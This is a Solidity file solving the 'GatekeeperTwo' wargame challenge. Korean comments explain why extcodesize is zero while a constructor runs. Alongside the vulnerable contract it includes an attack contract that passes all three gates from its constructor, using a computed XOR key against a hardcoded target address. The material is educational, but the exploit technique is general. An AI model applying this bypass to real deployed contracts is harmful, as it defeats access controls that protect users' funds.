// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeper{
    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin); // attack contract use
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller()) // hmmm... 
        }
        require(x == 0); // 컨트랙트 사이즈가 0이어야 됨... 그러려면 extcodesize의 취약점을 알아야 하는데 해당 취약점은 배포 과정에선 코드가 2개로 나뉨 실제코드와 construct코드로 나뉨
        // contstruct과정에선 extcodesize가 0임 왜? 아직 실제코드를 배포하지 않았기 때문임 그래서 construct가 끝나면 extcodesize > 0 이 되게됨
        _;
    }

    modifier gateThree(bytes8 _gateKey) { 
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }

    function test() public view returns(bytes8){
    return bytes8(
            type(uint64).max ^
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
        );
    }
}

contract AttackContract{
    bytes8 _gateKey;
    IGateKeeper target;

    constructor() {
        target = IGateKeeper(0x318393B469006f1553b453D7618d5029A043c900);
        _gateKey = bytes8(
            type(uint64).max ^
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );

        target.enter(_gateKey);
    }
}